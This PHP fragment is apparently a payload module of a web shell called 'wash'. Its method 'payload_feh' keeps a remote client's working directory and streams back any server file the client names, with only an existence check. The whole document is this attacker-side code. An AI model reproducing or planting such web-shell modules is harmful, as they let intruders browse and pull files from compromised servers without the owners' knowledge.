<?php

/**
 * Downloads a file
 *
 * @param string $args             Arguments passed from the wash client
 */
public function payload_feh($args){
    # emulate directory persistence
    chdir($this->cwd);

    # if the requested file exists, serve it up to the user
    if(file_exists($args['file'])){
        # extract some image information
        $image_data = getimagesize($args['file']);
        header("Content-Type: {$image_data['mime']}");
        readfile($args['file']);
    }
    
    # if not, provide a notification
    else { echo "File does not exist."; }
    die();
}

?>
